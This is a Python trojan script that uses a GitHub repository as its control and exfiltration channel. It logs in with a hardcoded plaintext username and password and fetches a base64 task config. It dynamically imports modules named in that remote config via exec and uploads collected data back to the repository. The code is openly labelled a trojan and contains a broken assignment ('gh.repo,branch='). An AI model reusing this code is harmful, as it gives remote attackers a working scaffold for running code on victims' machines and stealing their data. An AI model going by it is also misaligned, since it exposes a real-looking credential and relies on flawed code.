import json
import base64
import sys
import time
import imp
import random
import  threading
import queue
import os

from github3 import login,repos

trojan_id="abc"
trajan_config="%s.json"%trojan_id
data_path="data/%s/"%trojan_id
trojan_modules=[]
configured=False
task_queue=queue.Queue()
def connet_to_github():
    gh=login(username="theonezeroxf",password="XFblackzero9810")
    repo=gh.repository("theonezeroxf","chapter7")
    branch=repo.branch("master")
    return gh,repo,branch
def get_file_contents(filepath):
    gh,repo,branch=connet_to_github()
    # print(branch)
    # print(help(branch.commit.commit.tree.to_tree()))
    tree=branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        print(filename.path)
        if filepath in filename.path:
            print("[*] found file %s"%filepath)
            blob=repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():
    global configured
    config_json=get_file_contents(trajan_config)
    # print(config_json)
    config=json.loads(base64.b64decode(config_json))
    configured=True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s"%task['module'])
    return config

def store_module_result(data):
    gh.repo,branch=connet_to_github()
    remote_path="data/%s/%d.data"%(trojan_id,random.randint(1e3,1e5))
    repo.create(remote_path,"Commit message",base64.b64encode(data))
    return 

if __name__=="__main__":
    get_trojan_config()